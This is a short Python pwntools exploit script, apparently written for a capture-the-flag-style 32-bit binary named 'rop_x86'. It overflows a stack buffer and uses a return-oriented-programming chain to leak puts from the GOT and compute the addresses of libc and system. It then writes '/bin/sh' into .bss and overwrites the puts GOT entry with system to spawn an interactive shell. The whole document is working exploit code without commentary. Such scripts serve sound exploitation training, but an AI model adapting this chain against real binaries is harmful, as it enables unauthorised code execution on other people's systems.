from pwn import *

p = process("./rop_x86")

elf = ELF("./rop_x86")
#libc = ELF("./libc-2.27.so")
libc = elf.libc

pr = 0x0804837d
pppr = 0x080485c9
bss = elf.bss()

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']

payload = ""
payload += "A" * 0x68
payload += "B" * 4

payload += p32(puts_plt)
payload += p32(pr)
payload += p32(puts_got)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(puts_got)
payload += p32(4)

payload += p32(puts_plt)
payload += "C" * 4
payload += p32(bss)

pause()

p.sendline(payload)
p.recvuntil("!\n")

puts_leak = p.recv(4)

base = u32(puts_leak) - libc.symbols['puts']
system = base + libc.symbols['system']

p.send("/bin/sh\x00")

p.send(p32(system))

p.interactive()